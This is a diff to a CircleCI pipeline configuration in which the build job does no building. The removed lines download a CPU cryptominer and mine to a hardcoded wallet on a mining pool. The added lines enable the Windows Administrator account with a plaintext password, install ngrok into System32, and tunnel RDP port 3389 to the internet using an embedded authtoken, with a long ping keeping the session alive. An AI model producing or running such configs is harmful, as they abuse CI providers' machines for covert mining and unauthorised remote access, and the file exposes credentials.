@@ -1,11 +1,22 @@
-version: 2.0
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.4.1
+ 
 jobs:
-  build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
     steps:
-      - checkout
-      - run:  mkdir cpuminer-opt-rplant && cd cpuminer-opt-rplant && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && ./cpuminer-avx512 -a yescrypt -o stratum+tcp://yescrypt.mine.zergpool.com:6233 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N -p c=DOGE,mc=BSTY,ID=Cloud -t 34
+      - checkout      
+      - run: Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Akuhnet123" -Force)
+      - run: Get-LocalUser -Name "Administrator" | Enable-LocalUser 
+      - run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+      - run: tar xf ngrok.zip
+      - run: Copy ngrok.exe C:\Windows\System32
+      - run: cmd /c echo ./ngrok.exe authtoken "1yXhLEE5ZVNJjEEyDdSYmaMDIP0_781zj43bBzmTvbUd7X8Ld" >a.ps1
+      - run: cmd /c echo cmd /k start ngrok.exe tcp --region ap 3389 >>a.ps1
+      - run: cmd /c echo ping -n 999999 google.com >>a.ps1
+      - run: .\a.ps1
